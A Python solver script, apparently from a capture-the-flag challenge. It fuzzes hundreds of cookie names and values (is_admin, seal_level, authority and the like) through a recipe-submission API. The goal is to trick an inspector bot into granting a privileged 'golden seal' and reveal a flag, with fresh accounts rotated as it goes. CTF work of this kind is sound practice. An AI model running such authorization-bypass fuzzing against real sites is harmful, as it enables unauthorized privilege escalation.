#!/usr/bin/env python3
"""Re-run the cookie-name and value axes with the batch size Chrome actually honours.

Measured from a real tab in this session: plant 200/260/320 max-length cookies and
`document.cookie` still reports 169/167/165 - the browser keeps ~170 cookies per host and
silently rejects the rest. Every "300 cookies in one batch" sweep I ran therefore only ever
sent its first ~170 names, so roughly 40% of the names in `name_sweep2.py`/`name_sweep3.py`
never reached the inspector, and the same cap applied to the 37-value axis.

Fix: 155 names per batch (comfortably under the cap, and well under the 16 KB header budget
because the names are short), one value set per batch. Phase A walks the entire generated
name list with the authority string; phase B takes the 155 strongest names across the other
values. Oracle is unchanged: the Seal cell on /dashboard, which must read `standard` for the
test to be meaningful (a `NONE` row means the batch jammed, not that a name worked).
"""
import re
import sys
import time

from cc import new_baker

ROOTS = """role user_role userrole roles usertype type kind level tier rank group staff
admin isadmin is_admin permission permissions privilege privileges clearance authority auth
seal seallevel seal_level sealtype golden gold goldseal golden_seal chief headchief
head_chief thechief the_chief chef inspector inspector_role quality_inspector supervisor
foreman manager director owner boss ceo founder president baker master grandmaster legend
legendary approved certified verified trusted internal privileged override bypass debug dev
mode review review_level reviewlevel reviewer verdict decision outcome stamped sealed
status state badge token sess session csrf signature hmac apikey api_key secret salt
mixer drum tray dough batch recipe ingredient cookie cookies cc cookiecorp orbital sector
city moon sugar sprinkles star dust solar cosmic quantum plasma gravity comet vanilla
cocoa honey who actor principal identity sub iss aud xr ccrole cc_role ccseal clevel
x_role xrole xlevel x-seal xseal priority scope grant granted reviewer_role reviewed_by
sealed_by sealedby approved_by approvedby stamp_level authority_level inspector_key
chief_key seal_key golden_key magic secret_word passphrase yes no null undefined nan inf
infinity true false zero one admin_only staff_only internal_only chiefbot golden_seal_key
seal_authority review_authority verified_by signed_by attestation attest certification""".split()
PREFIXES = ["", "cc_", "cc-", "x_", "cookiecorp_", "cookie_", "cookiecorp-", "x-"]
CAP = 155


def names():
    out, seen = [], set()
    for p in PREFIXES:
        for r in ROOTS:
            for cand in (p + r, p + r.replace("_", "-"), p + r.replace("_", "")):
                forms = (cand, cand.upper(), cand.capitalize()) if len(out) < 420 else (cand,)
                for c in forms:
                    if c and c not in seen and len(c) <= 40:
                        seen.add(c)
                        out.append(c)
    return out


ALL = names()
log_lock = []


def log(*a):
    sys.stdout.buffer.write(("[%s] " % time.strftime("%H:%M:%S") + " ".join(str(x) for x in a)
                             + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def cell(c, rid):
    code, dash, dt = c.get("/dashboard")
    blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % rid, dash or "", re.S)
    if not blk:
        return "norow", "?"
    b = blk.group(0)
    st = re.search(r'class="pill (\w+)">(\w+)</span>', b)
    tail = " ".join(re.sub(r"<[^>]+>", " ", b.split("</span>")[-1]).split())
    return ("NONE" if "&mdash;" in tail else ("standard" if "standard" in tail else tail[:26]),
            st.group(2) if st else "?")


def run_batch(c, label, val, pool):
    ings, used = [], set()
    total = 0
    for n in pool:
        if n in used or len(ings) >= CAP:
            continue
        if total + len(n) + len(val) + 3 > 12000:
            break
        used.add(n)
        ings.append({"name": n, "value": val})
        total += len(n) + 1 + len(val) + 2
    code, out, dt = c.post("/api/recipe", {"title": label[:58], "ingredients": ings})
    rid = out.get("id") if isinstance(out, dict) else None
    if not rid:
        log("  %-16s save -> %s %s" % (label, code, str(out)[:60]))
        return False
    for k in range(12):
        sc, so, _ = c.post("/api/recipe/%s/submit" % rid, {})
        if isinstance(so, dict) and so.get("ok"):
            break
        time.sleep(7)
    seal = stt = "?"
    for k in range(16):
        time.sleep(5)
        seal, stt = cell(c, rid)
        if stt == "reviewed":
            break
    log("  %-16s %3d cookies %6dB -> %-9s %s" % (label, len(ings), total, stt, seal))
    if seal not in ("standard", "NONE"):
        code, page, _ = c.get("/recipe/%s" % rid)
        fl = re.findall(r"sun\{[^{}\r\n]{1,200}\}", str(page))
        log("      !!! %s -> %r %s" % (label, seal, fl))
        open("../files/golden_sweep4_%s.html" % re.sub(r"\W", "_", label), "w",
             encoding="utf-8").write(str(page))
        if fl:
            open("../flag.txt", "w", encoding="utf-8").write(fl[0] + "\n")
            sys.exit(0)
    return True


log("generated %d names, %d batches of <=%d needed" % (len(ALL), (len(ALL) + CAP - 1) // CAP, CAP))
u, c, _ = new_baker("s4")
made = 0
log("=== phase A: every name with value 'chief' ===")
for i in range(0, len(ALL), CAP):
    if made >= 8:
        u, c, _ = new_baker("s4")
        made = 0
        log("new user %s" % u)
    ok = run_batch(c, "A%d" % (i // CAP), "chief", ALL[i:i + CAP])
    made += 1 if ok else 0
    time.sleep(0.5)

log("=== phase B: strongest 155 names across the other values ===")
TOP = [n for n in ALL[:600]]
for v in ["true", "1", "yes", "gold", "golden", "inspector", "admin", "approved", "sealed",
          "certified", "grandmaster", "cookiecorp", "golden_seal", "GOLDEN", "1962",
          "brighter-tomorrow", "legendary", "root", "system", "internal"]:
    if made >= 8:
        u, c, _ = new_baker("s4")
        made = 0
        log("new user %s" % u)
    ok = run_batch(c, "B-" + v, v, TOP)
    made += 1 if ok else 0
    time.sleep(0.4)
log("sweep4 complete")
